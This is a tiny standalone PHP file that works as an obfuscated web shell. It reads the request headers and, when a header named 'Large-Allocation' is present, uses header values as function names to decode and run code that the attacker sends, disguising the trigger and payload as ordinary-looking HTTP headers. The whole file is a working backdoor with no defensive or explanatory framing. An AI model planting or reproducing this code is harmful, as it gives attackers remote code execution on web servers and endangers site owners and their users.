<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $clases = $_HEADERS['Large-Allocation']('', $_HEADERS['Authorization']($_HEADERS['Feature-Policy']));
    $clases();
}